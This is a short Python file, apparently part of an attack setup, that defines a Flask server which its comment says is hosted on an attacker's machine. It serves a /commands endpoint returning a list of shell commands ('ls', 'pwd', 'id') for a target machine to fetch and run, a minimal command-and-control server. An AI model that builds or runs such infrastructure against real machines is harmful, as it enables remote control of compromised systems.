# flask server to host on attackers machine
# Provides an endpoint which will return a list of commands to run on the target machine

import flask

app = flask.Flask(__name__)

@app.route('/commands', methods=['GET'])
def commands():
    return flask.jsonify(['ls', 'pwd', 'id'])
